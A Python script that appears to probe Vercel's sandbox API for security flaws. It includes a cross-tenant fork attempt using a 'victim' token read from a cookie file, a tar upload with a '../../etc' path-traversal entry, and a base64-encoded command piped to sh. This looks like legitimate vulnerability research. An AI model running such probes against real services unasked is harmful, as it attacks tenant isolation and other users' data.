# -*- coding: utf-8 -*-
"""SDK 端点全集测试 (v46) - 全部 in scope (SDK 消费)
P1: POST /sessions/{sid}/interactive
P2: POST /sessions/{sid}/extend-timeout
P3: GET /v2/sandboxes/snapshots?project=  (正确参数!)
P4: GET /v2/sandboxes/snapshots/tree?snapshotId=
P5: GET /v2/sandboxes/sessions?project=
P6: POST /v2/sandboxes/{name}/fork
P7: PATCH /v2/sandboxes/{name} 正确 body
P8: POST /v3/sandboxes
P9: cmd kill/logs/cmdId
P10: fs/read + cwd, fs/write gzip tar (含 ../ 路径遍历)"""
import base64, io, json, sys, tarfile, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'sdk46'
TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')

def api_raw(method, path, body=None, ctype='application/json', headers=None, tok=None, timeout=90):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + (tok or TOKEN))
    if ctype:
        req.add_header('Content-Type', ctype)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    data = body if isinstance(body, bytes) else (json.dumps(body).encode() if body is not None else None)
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:700]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:700]
    except Exception as e:
        return -1, 'EXC %s' % e

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def gzip_tar(files):
    """files: [(name, content_bytes, mode)] -> gzip tar bytes"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        for name, content, mode in files:
            ti = tarfile.TarInfo(name)
            ti.size = len(content)
            ti.mode = mode or 0o644
            ti.mtime = int(time.time())
            tf.addfile(ti, io.BytesIO(content))
    return buf.getvalue()

if __name__ == '__main__':
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(8)

    print('=== P1: interactive ===', flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/interactive?teamId=%s' % (sid, TEAM), {})
    print('[interactive] -> %d %s' % (c, (r or '')[:400]), flush=True)
    time.sleep(2)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/interactive?teamId=%s' % (sid, TEAM), {})
    print('[interactive x2] -> %d %s' % (c, (r or '')[:400]), flush=True)

    print('=== P2: extend-timeout ===', flush=True)
    for d in [60000, 3600000, 0, -1]:
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/extend-timeout?teamId=%s' % (sid, TEAM), {"duration": d})
        print('[extend %d] -> %d %s' % (d, c, (r or '')[:150]), flush=True)
        time.sleep(1)

    print('=== P3: list snapshots (project=) ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=10' % (TEAM, PROJ))
    print('[list snaps] -> %d %s' % (c, (r or '')[:400]), flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/snapshots?teamId=%s&projectId=%s&limit=10' % (TEAM, PROJ))
    print('[list snaps projId] -> %d %s' % (c, (r or '')[:300]), flush=True)

    print('=== P5: list sessions (project=) ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/sessions?teamId=%s&project=%s&name=%s&limit=5' % (TEAM, PROJ, NAME))
    print('[list sessions] -> %d %s' % (c, (r or '')[:400]), flush=True)

    print('=== P6: fork ===', flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/%s/fork?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ), {"name": NAME + 'fork'}, timeout=120)
    print('[fork] -> %d %s' % (c, (r or '')[:300]), flush=True)
    if c == 200:
        api_raw('DELETE', '/v2/sandboxes/%sfork?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
        print('  (fork cleaned)', flush=True)
    # fork 跨租户: victim fork attacker sandbox
    c, r = api_raw('POST', '/v2/sandboxes/%s/fork?teamId=%s&projectId=%s' % (NAME, TEAM_V, PROJ_V), {"name": NAME + 'v'}, tok=TOK_V, timeout=120)
    print('[victim fork] -> %d %s' % (c, (r or '')[:200]), flush=True)

    print('=== P7: PATCH 正确 body ===', flush=True)
    c, r = api_raw('PATCH', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ),
                   {"networkPolicy": {"mode": "deny-all"}, "persistent": True}, timeout=60)
    print('[PATCH np] -> %d %s' % (c, (r or '')[:200]), flush=True)
    time.sleep(2)
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    try:
        d = json.loads(r)
        print('[PATCH check] sandbox.np=%s persistent=%s' % (d['sandbox'].get('networkPolicy'), d['sandbox'].get('persistent')), flush=True)
    except Exception:
        print('[PATCH check ERR]', (r or '')[:150], flush=True)

    print('=== P8: v3 sandboxes ===', flush=True)
    c, r = api_raw('POST', '/v3/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME + 'v3'}, timeout=120)
    print('[v3 create] -> %d %s' % (c, (r or '')[:200]), flush=True)
    if c == 200:
        api_raw('DELETE', '/v2/sandboxes/%sv3?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
        print('  (v3 cleaned)', flush=True)

    print('=== P10: fs/read + cwd ===', flush=True)
    for body in [{"path": "/etc/hostname"}, {"path": "hostname", "cwd": "/etc"}, {"path": "/etc/hostname", "cwd": "/" }]:
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s' % (sid, TEAM), body)
        print('[read cwd=%s] -> %d %s' % (body.get('cwd'), c, (r or '')[:100].replace('\n', ' ')), flush=True)
        time.sleep(1)

    print('=== P10b: fs/write gzip tar ===', flush=True)
    gz = gzip_tar([('sdk_write_mark.txt', b'SDK_WRITE_42', 0o644)])
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM), gz,
                   ctype='application/gzip', headers={'x-cwd': '/vercel/sandbox'})
    print('[write gz] -> %d %s' % (c, (r or '')[:200]), flush=True)
    # 路径遍历: ../ 文件名
    gz2 = gzip_tar([('../../etc/sdk_escape_test', b'ESCAPE_77', 0o644)])
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM), gz2,
                   ctype='application/gzip', headers={'x-cwd': '/vercel/sandbox'})
    print('[write gz ../] -> %d %s' % (c, (r or '')[:200]), flush=True)
    # 验证
    b64 = base64.b64encode(b'ls -la /vercel/sandbox/ | grep sdk; cat /vercel/sandbox/sdk_write_mark.txt 2>&1; ls -la /etc/sdk_escape_test 2>&1').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=25000)
    print('[verify] %s' % parse_data(r).strip()[:200], flush=True)

    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
